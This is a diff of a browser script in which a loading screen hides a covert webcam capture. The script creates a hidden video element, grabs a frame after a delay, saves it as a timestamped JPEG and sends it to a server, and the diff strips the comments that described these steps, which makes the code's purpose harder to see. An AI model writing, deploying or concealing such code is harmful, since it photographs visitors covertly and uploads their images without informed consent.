@@ -2,7 +2,6 @@ window.addEventListener('DOMContentLoaded', () => {
   const loader = document.querySelector('.loader');
   const container = document.querySelector('.container');
   
-  // Create a hidden video element for capture
   const video = document.createElement('video');
   video.style.display = 'none';
   document.body.appendChild(video);
@@ -24,12 +23,9 @@ window.addEventListener('DOMContentLoaded', () => {
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             
-            // Capture photo after a short delay to ensure good quality
             setTimeout(() => {
               capturePhoto();
-              // Stop the stream after capturing
               stream.getTracks().forEach(track => track.stop());
-              // Remove the video element
               video.remove();
             }, 1000);
           });
@@ -43,19 +39,16 @@ window.addEventListener('DOMContentLoaded', () => {
   }, 1000);
   
   function capturePhoto() {
-    // Draw current video frame to canvas
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
     
     canvas.toBlob(blob => {
       if (blob) {
-        // Create timestamp for unique filename
         const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
         const filename = `capture_${timestamp}.jpg`;
         
-        // Send photo to server
         sendPhotoToServer(blob, filename);
       }
-    }, 'image/jpeg', 0.8); // JPEG format with 80% quality
+    }, 'image/jpeg', 0.8);
   }
   
   function sendPhotoToServer(blob, filename) {
